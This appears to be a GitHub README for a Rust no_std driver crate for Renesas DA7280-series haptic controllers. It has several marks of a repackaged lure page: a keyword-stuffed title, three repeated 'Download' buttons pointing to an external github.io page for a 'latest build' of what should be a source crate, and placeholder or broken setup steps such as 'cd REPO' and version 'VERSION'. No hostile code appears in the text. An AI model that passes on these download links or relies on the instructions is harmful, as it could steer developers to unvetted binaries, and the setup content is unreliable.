# da728x - Embedded Haptic Driver Library 2026

> **da728x is an asynchronous, `no_std` Rust driver for Renesas DA7280, DA7281, and DA7282 haptic controller ICs, communicating through I2C on embedded hardware.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20no__std-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-development-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathanoatzhughes3455/da728x-i2c-driver?style=flat-square)](https://github.com/nathanoatzhughes3455/da728x-i2c-driver)

---

<p align="center">
  <a href="https://nathanoatzhughes3455.github.io/da728x-i2c-driver/">
    <img src="https://img.shields.io/badge/Download-da728x%20Latest-brightgreen?style=for-the-badge" alt="Download da728x">
  </a>
</p>

> **[Download da728x](https://nathanoatzhughes3455.github.io/da728x-i2c-driver/)**

---

[Download Latest Build](https://nathanoatzhughes3455.github.io/da728x-i2c-driver/)

---

## Overview

The da728x crate brings Renesas DA7280, DA7281, and DA7282 haptic driver support to embedded Rust applications. It is built for `no_std` environments with limited resources and uses I2C to control linear resonant actuator (LRA) systems.

Both asynchronous applications and projects using a blocking programming model are supported. The driver brings together hardware setup, playback commands, resonant-frequency configuration, diagnostics, event reporting, and waveform handling.

---

## Capabilities

- Asynchronous operation with an optional blocking interface
- Compatibility with Renesas DA7280, DA7281, and DA7282 ICs
- I2C transport for embedded hardware
- Configuration checks before the device is operated
- LRA resonant-frequency configuration and control
- Commands for starting and stopping playback
- System event reporting and diagnostic support
- LRA frequency-track, wideband, and custom waveform modes
- DRO mode
- Waveform-memory transfers and `RTWM_MODE`
- Code-based waveform and sequence construction
- Interactive web-based waveform builder
- Optional `defmt` logging support

---

## Add the Crate

Declare the dependency in the embedded project's `Cargo.toml`:

```toml
[dependencies]
da728x = "VERSION"
```

Substitute `VERSION` with the release or repository revision required by your project.

To build from a local checkout:

```bash
git clone https://github.com/nathanoatzhughes3455/da728x-i2c-driver.git
cd REPO
cargo build
```

Select any needed crate features, including the blocking API or `defmt` logging, based on the configuration exposed by the chosen revision. The driver must be initialized with an embedded I2C implementation and the configuration for the DA728x variant being used.

---

## Getting Started

An integration generally consists of these steps:

1. Set up an I2C bus through the target platform's embedded HAL.
2. Choose the connected DA7280, DA7281, or DA7282 variant.
3. Create the driver settings and validate them.
4. Pass the I2C interface into the driver constructor.
5. Set the desired resonant-frequency and waveform behavior.
6. Write waveform data when the application needs it.
7. Start playback and observe device events or diagnostics.
8. Stop playback after the haptic effect finishes.

For a project using the blocking API, the sequence can look like this:

```rust
let config = Config::default();
let driver = Da728x::new_blocking(i2c, address, config)?;

driver.enable_playback()?;
driver.disable_playback()?;
```

Constructor names, concrete types, I2C address handling, and enabled features can vary with the selected crate revision and embedded HAL. Consult the generated Rust API documentation and the repository examples for device-specific usage.

---

## Driver Setup

Configuration is expressed in Rust. Use the crate's configuration types or builder to define the device mode, actuator behavior, frequency settings, waveform options, and diagnostic preferences.

A minimal builder-based example is:

```rust
let config = Config::builder()
    .validate()?;
```

Waveforms and playback sequences may be generated directly in code. Alternatively, they can be prepared with the interactive waveform builder web application and then written into the driver's waveform memory.

Applications that already use `defmt` can opt into the crate's `defmt` integration for additional embedded debug output.

---

## Requirements

- A Rust toolchain configured for an embedded target
- A `no_std`-capable embedded environment
- An I2C peripheral with a compatible embedded HAL implementation
- One supported Renesas haptic driver:
  - DA7280
  - DA7281
  - DA7282
- A linear resonant actuator for LRA output
- Enough device memory and transport capacity for the waveform data being used

Embedded operation does not depend on a desktop runtime. The waveform builder web application is provided as an optional tool during development.

---

## Frequently Asked Questions

### What Renesas devices can da728x control?

The crate supports the DA7280, DA7281, and DA7282 haptic driver ICs.

### Is `std` required?

No. da728x is intended for Rust `no_std` embedded targets.

### Can the driver be used without an async executor?

Yes. Async support is the main API model, and an optional blocking interface is available for applications that do not use asynchronous execution.

### What options are available for making waveforms?

Waveforms and sequences may be built programmatically. The project also includes an interactive waveform builder web application, and waveform data can be uploaded to the device's waveform memory.

### Does the library support LRA frequency tracking?

It does. Frequency-track, wideband, and custom waveform modes are available for LRA applications, together with resonant-frequency controls.

### What should I check when the device does not behave as expected?

Verify the I2C wiring, selected DA728x variant, configured address, actuator connections, and validated driver configuration. If the application supports it, enable `defmt` logging and review the system events and diagnostic data returned by the device.

### Where do updates come from?

New versions and builds are made available through the repository. Check the project history and release information before applying an update to an embedded application.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
